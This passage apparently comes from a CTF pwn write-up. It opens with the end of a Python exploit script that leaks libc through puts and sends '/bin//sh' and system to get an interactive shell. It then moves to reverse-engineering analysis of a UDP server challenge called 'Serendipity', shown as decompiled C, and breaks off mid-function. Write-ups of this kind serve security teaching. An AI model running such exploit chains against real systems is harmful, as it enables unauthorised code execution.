</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(pl), <span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(u64(pl[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(magic)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; Welcome to sanctuary of time&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">=</span>u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>og<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1052fa</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin//sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="2-serendipity">2. Serendipity</h1>
<h2 id="overview-1">Overview</h2>
<p><img src="https://hackmd.io/_uploads/B1r_03VUa.png" alt="image"></p>
<p>Hmm, it&rsquo;s a 64 bits ELF file and has full protect, sound good to play with it.</p>
<h2 id="analysis-1">Analysis</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+4h] [rbp-ECh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+8h] [rbp-E8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> j; <span style="color:#75715e">// [rsp+Ch] [rbp-E4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pthread_t newthread; <span style="color:#75715e">// [rsp+10h] [rbp-E0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>addr; <span style="color:#75715e">// [rsp+18h] [rbp-D8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+20h] [rbp-D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  fd_set <span style="color:#f92672">*</span>p_readfds; <span style="color:#75715e">// [rsp+28h] [rbp-C8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [rsp+30h] [rbp-C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ssize_t v11; <span style="color:#75715e">// [rsp+38h] [rbp-B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">timeval</span> timeout; <span style="color:#75715e">// [rsp+40h] [rbp-B0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> s; <span style="color:#75715e">// [rsp+50h] [rbp-A0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  fd_set readfds; <span style="color:#75715e">// [rsp+60h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp+E8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v15 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  pipe(p0);
</span></span><span style="display:flex;"><span>  pipe(p1);
</span></span><span style="display:flex;"><span>  pipe(p2);
</span></span><span style="display:flex;"><span>  pipe(p3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( pthread_mutex_init(<span style="color:#f92672">&amp;</span>mutex, <span style="color:#ae81ff">0LL</span>) <span style="color:#f92672">||</span> pthread_mutex_init(<span style="color:#f92672">&amp;</span>mutex2, <span style="color:#ae81ff">0LL</span>) )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;pthread_mutex_init&#34;</span>);
</span></span><span style="display:flex;"><span>  pthread_create(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, session, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;socket&#34;</span>);
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(s));
</span></span><span style="display:flex;"><span>  s.sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)s.sa_data <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">0x26FDu</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>s.sa_data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( bind(fd, <span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x10u</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;bind&#34;</span>);
</span></span><span style="display:flex;"><span>  addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x214uLL</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      p_readfds <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>readfds;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xF</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>        p_readfds<span style="color:#f92672">-&gt;</span>fds_bits[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      readfds.fds_bits[fd <span style="color:#f92672">/</span> <span style="color:#ae81ff">64</span>] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">1LL</span> <span style="color:#f92672">&lt;&lt;</span> (fd <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>);
</span></span><span style="display:flex;"><span>      timeout.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      timeout.tv_usec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( select(fd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>readfds, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#f92672">&amp;</span>timeout) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        error(<span style="color:#e6db74">&#34;select&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( (readfds.fds_bits[fd <span style="color:#f92672">/</span> <span style="color:#ae81ff">64</span>] <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1LL</span> <span style="color:#f92672">&lt;&lt;</span> (fd <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>))) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    memset(addr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x214uLL</span>);
</span></span><span style="display:flex;"><span>    memset(v8, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    v11 <span style="color:#f92672">=</span> recvfrom(fd, buf, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">0</span>, addr, (socklen_t <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v11 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      error(<span style="color:#e6db74">&#34;recvfrom&#34;</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( j <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_22;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)buf <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    write(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>LABEL_22:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)check_data(addr, v8, buf) )
</span></span><span style="display:flex;"><span>      use_opcode(addr, v8);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>First, the server creates a connection using the UDP method that allows users to send packets to</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">session</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  time_t v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    pthread_mutex_lock(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_6100 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;=</span> qword_6108[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_6100 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          qword_6108[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          printf(<span style="color:#e6db74">&#34;session %d cleaned</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pthread_mutex_unlock(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It creates 4 pipes, use <code>pthread</code> to create a maximum of 4 threads for connection, reading, and writing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>select(fd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>readfds, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#f92672">&amp;</span>timeout) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> 
</span></span></code></pre></div><p>It creates a UDP connection and uses the select function to handle multiple file descriptors. The program waits until one or more of the file descriptors become &ldquo;ready&rdquo;.</p>
<p>To send and receive data to users, <code>sendto()</code> and <code>recvfrom()</code> functions are used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v11 <span style="color:#f92672">=</span> recvfrom(fd, buf, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">0</span>, addr, (socklen_t <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family);
</span></span></code></pre></div><p>The program requires the user to send data in a specific structure, which is outlined below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">data</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 magic;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 op_code;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> mess[<span style="color:#ae81ff">4086</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, it checks the message received from the user, if it checks with each <code>thread_id</code>, the file of op_code is ignored and uses the first 8 bytes to compare with each <code>thread_id</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">session_data</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int64 id;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> mess[<span style="color:#ae81ff">4086</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If it matches, it writes the message to the pipe write of the appropriate thread and continues the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( j <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_22;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    write(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>LABEL_22:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)check_data(addr, v8, (<span style="color:#66d9ef">__int64</span>)buf) )
</span></span><span style="display:flex;"><span>      use_opcode((<span style="color:#66d9ef">__int64</span>)addr, (<span style="color:#66d9ef">__int64</span>)v8);
</span></span></code></pre></div><p>Otherwise, it will go to the <code>check_data()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">check_data</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2, data <span style="color:#f92672">*</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  a2<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>magic;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x70303070</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    a2<span style="color:#f92672">-&gt;</span>opcode <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>    a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFFFu</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>(a2<span style="color:#f92672">-&gt;</span>mess, a3<span style="color:#f92672">-&gt;</span>mess, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;packet too large</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send_to</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;server magic mismatch</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send_to</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The program checks whether the magic field of the message is equal to <code>0x70303070</code> and if the size field is smaller than 4095. If both these conditions are true, the message is copied to <code>use_opcode()</code> function (which I will talk about later). If either of the conditions is false, the program returns 1 and goes back to the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">use_opcode</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> opcode; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  opcode <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x301</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    print_data(a1, a2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x301</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_9;
